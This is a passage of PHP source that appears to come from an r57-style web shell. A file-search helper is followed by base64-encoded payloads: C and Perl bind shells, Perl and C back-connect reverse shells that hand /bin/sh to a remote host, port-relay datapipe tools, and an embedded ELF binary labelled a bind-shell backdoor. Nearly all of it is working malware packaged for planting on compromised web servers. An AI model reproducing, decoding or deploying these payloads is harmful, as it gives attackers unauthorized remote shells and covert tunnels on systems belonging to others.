            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$port_bind_bd_cs="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAAAIlEJASLRfCJBCToKP7//4XAeRjHBCSTiQQI6Kj9///HBCQBAAAA6Bz+///HRCQECAAAAItF8IkEJOi5/f//hcB5GMcEJJiJBAjoef3//8cEJAEAAADo7f3//8dF6BAAAACNReiNVcSJRCQIiVQkBItF8IkEJOht/f//iUX0g330AHkMxwQkjIkECOg4/f//6EP9//+FwA+EpwAAAItF+Ln/////iUW4uAAAAAD8i3248q6JyPfQg+gBx0QkDAAAAACJRCQIi0X4iUQkBItF9IkEJOiQ/f//x0QkBAAAAACLRfSJBCToPf3//8dEJAQBAAAAi0X0iQQk6Cr9///HRCQEAgAAAItF9IkEJOgX/f//x0QkCAAAAADHRCQEn4kECMcEJJ+JBAjoe/z//4tF8IkEJOiA/P//xwQkAAAAAOgE/f//i0X0iQQk6Gn8///pDv///1WJ5VdWMfZT6H/9//+BwyMSAACD7AzoEfz//42DIP///42TIP///4lF8CnQwfgCOcZzFonX/xSyi0Xwg8YBKfiJ+sH4AjnGcuyDxAxbXl9dw1WJ5YPsGIld9Ogt/f//gcPREQAAiXX4iX38jbMg////jbsg////Kf7B/gLrA/8Ut4PuAYP+/3X16DoAAACLXfSLdfiLffyJ7F3DkFWJ5VOD7AShrJkECIP4/3QSu6yZBAj/0ItD/IPrBIP4/3Xzg8QEW13DkJCQVYnlU+i7/P//gcNfEQAAg+wE6LH8//+DxARbXcMAAAADAAAAAQACADo6IHc0Y2sxbmctc2hlbGwgKFByaXZhdGUgQnVpbGQgdjAuMykgYmluZCBzaGVsbCBiYWNrZG9vciA6OiAKCgBzb2NrZXQAYmluZABsaXN0ZW4AL2Jpbi9zaAAAAAAAAP////8AAAAA/////wAAAAAAAAAAAQAAACQAAAAMAAAAiIQECA0AAAAkiQQIBAAAAEiBBAgFAAAAEIMECAYAAADggQQICgAAALAAAAALAAAAEAAAABUAAAAAAAAAAwAAAIyaBAgCAAAAeAAAABQAAAARAAAAFwAAABCEBAgRAAAACIQECBIAAAAIAAAAEwAAAAgAAAD+//9v6IMECP///28BAAAA8P//b8CDBAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw